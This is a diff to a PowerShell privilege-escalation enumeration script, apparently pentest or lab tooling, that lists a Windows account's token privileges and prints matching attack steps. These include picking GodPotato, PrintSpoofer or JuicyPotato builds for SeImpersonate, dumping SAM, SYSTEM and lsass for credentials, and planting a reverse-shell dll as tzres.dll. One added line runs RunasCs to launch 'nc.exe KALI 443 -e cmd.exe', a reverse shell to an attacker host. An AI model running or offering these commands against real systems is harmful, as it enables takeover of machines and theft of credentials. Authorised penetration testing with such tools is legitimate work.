@@ -36,11 +36,18 @@ $net = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" | Where-
 L ("dotnet    " + ($net -join " "))
 $build = [int]$os.BuildNumber
 L ""
-L "privileges (enabled only)"
-$privs = whoami /priv | Where-Object { $_ -match "Enabled" } | ForEach-Object { ($_ -split "\s+")[0] }
-$privs | ForEach-Object { L ("  " + $_) }
+L "privileges (every one assigned to the token: Disabled means not switched on yet, exploits switch it on themselves)"
+$privs = whoami /priv | Where-Object { $_ -match "^Se\w+Privilege" } | ForEach-Object { ($_ -split "\s+")[0] + "  " + (($_ -split "\s{2,}")[-1]) }
+$privs | Where-Object { $_ -notmatch "^(SeChangeNotifyPrivilege|SeIncreaseWorkingSetPrivilege)" } | ForEach-Object { L ("  " + $_) }
 if ($privs -match "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege") {
-    if ($build -ge 17763) { V "SeImpersonate on build ${build}: GodPotato (gp4/gp2/gp35) or SigmaPotato (sig). PrintSpoofer (ps64) if Spooler runs" }
+    # the GodPotato build must match the newest .NET runtime present: v4 -> gp4, v3.5 -> gp35, only v2 -> gp2.
+    # Gust: four days lost running the 3.5 build on a box with only v4.0.30319
+    $gp = "gp2"
+    if ($net -match "^v3[.]5") { $gp = "gp35" }
+    if ($net -match "^v4") { $gp = "gp4" }
+    $arch = "x64"; if ($os.OSArchitecture -notmatch "64") { $arch = "x86: use the 32-bit builds (ps32 jp32 sw32), the x64 ones just fail" }
+    L ("  .NET runtimes " + ($net -join " ") + "  ->  " + $gp + "   arch " + $arch)
+    if ($build -ge 17763) { V ("SeImpersonate on build " + $build + ": " + $gp + ".exe -cmd `"cmd /c whoami`"  (or sig). PrintSpoofer (ps64) if Spooler runs. JuicyPotato does not work here") }
     elseif ($build -ge 17134) { V "SeImpersonate on build ${build}: PrintSpoofer (ps64), needs Spooler. JuicyPotato died at 1809" }
     else { V "SeImpersonate on build ${build}: JuicyPotato (jp64) with a CLSID from clsid/<build>.list, or PrintSpoofer (ps64)" }
     $sp = Get-Service Spooler
@@ -48,11 +55,13 @@ if ($privs -match "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege") {
 }
 if ($privs -match "SeBackupPrivilege") { V "SeBackup: copy SAM+SYSTEM (sbpc/sbpu dlls, or reg save) then secretsdump LOCAL. On a DC: diskshadow + ntds.dit" }
 if ($privs -match "SeRestorePrivilege") { V "SeRestore: overwrite a service binary or utilman.exe (sra), then trigger it" }
-if ($privs -match "SeManageVolumePrivilege") { V "SeManageVolume: smv.exe grants write on C:\, then drop a dll next to a SYSTEM binary (tzres.dll trick)" }
+if ($privs -match "SeManageVolumePrivilege") { V "SeManageVolume: run smv.exe (gives Users write on C:\Windows), then copy a reverse-shell dll to C:\Windows\System32\wbem\tzres.dll and run systeminfo. Shell comes back as the service that loads it" }
 if ($privs -match "SeLoadDriverPrivilege") { V "SeLoadDriver: Capcom.sys / EoPLoadDriver" }
 if ($privs -match "SeDebugPrivilege") { V "SeDebug: dump lsass (pd64 -ma lsass.exe) or inject into a SYSTEM process" }
 if ($privs -match "SeTakeOwnershipPrivilege") { V "SeTakeOwnership: takeown on a service binary or utilman.exe" }
 L ""
+L "running as a service account? a cracked domain account that cannot log on here needs RunasCs (rcs), not runas:"
+L "  rcs.exe USER PASS \"C:\Windows\Temp\nc.exe KALI 443 -e cmd.exe\" --remote-impersonation --logon-type 8"
 L "groups of note"
 whoami /groups | Where-Object { $_ -match "Admin|Backup|Remote|Server Operators|Account Operators|Print Operators|DnsAdmins|Hyper-V|Distributed COM" } | ForEach-Object { L ("  " + (($_ -split "\s{2,}")[0])) }
 $ue = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
